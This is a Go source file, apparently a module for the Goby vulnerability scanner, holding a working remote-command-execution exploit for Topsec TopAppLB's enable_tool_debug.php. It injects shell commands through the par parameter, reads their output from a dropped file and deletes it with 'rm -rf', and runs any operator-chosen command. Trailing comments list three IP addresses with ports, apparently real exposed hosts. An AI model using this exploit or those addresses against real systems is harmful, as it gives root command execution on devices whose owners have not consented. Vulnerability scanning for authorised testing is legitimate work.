package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Topsec TopAppLB enable tool debug.php RCE",
    "Description": "Topsec_TopAppLB application delivery system /acc/tools/enable_tool_debug.php file diskname parameter remote command execution vulnerability, executable system commands, resulting in the system being hacked.",
    "Product": "topsec-TopAppLB",
    "Homepage": "http://www.topsec.com.cn/",
    "DisclosureDate": "2021-05-27",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "app=\"topsec-TopAppLB\"",
    "Level": "3",
    "Impact": "<p>Hackers can execute arbitrary commands on the server and write into the backdoor, thereby invading the server and obtaining the administrator's authority of the server, which is very harmful.</p>",
    "Recommendation": "<p>1. Strictly filter the data entered by the user and prohibit the execution of system commands.</p><p>2. Internet access is prohibited</p><p>3. Upgrade the system</p>",
    "References": [
        "http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2015-0117621"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "pwd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10197"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//httpclient.SetDefaultProxy("http://127.0.0.1:8080")
			cfg := httpclient.NewGetRequestConfig("/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1%27%20%7C%20id%20%3E%20vul2.txt%20%7C%27")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(u, cfg)
			cfgRes := httpclient.NewGetRequestConfig("/acc/tools/vul2.txt")
			cfgRes.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgRes.VerifyTls = false
			resp, err := httpclient.DoHttpRequest(u, cfgRes)
			cfgRm := httpclient.NewGetRequestConfig("/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1%27%20%7C%20rm%20-rf%20vul2.txt%20%7C%27")
			cfgRm.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgRm.VerifyTls = false
			httpclient.DoHttpRequest(u, cfgRm)
			if err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "uid=0(root)")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			//httpclient.SetDefaultProxy("http://127.0.0.1:8080")
			enCmd := url.QueryEscape(fmt.Sprintf("%s", cmd))
			uri := "/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1%27%20%7C%20" + enCmd + "%20%3E%20vul2.txt%20%7C%27"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			cfgRes := httpclient.NewGetRequestConfig("/acc/tools/vul2.txt")
			cfgRes.VerifyTls = false
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgRes)
			cfgRm := httpclient.NewGetRequestConfig("/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1%27%20%7C%20rm%20-rf%20vul2.txt%20%7C%27")
			cfgRm.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgRm.VerifyTls = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfgRm)
			if err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}

//123.160.247.173:8888
//218.29.118.108:444
//60.191.91.134:8888
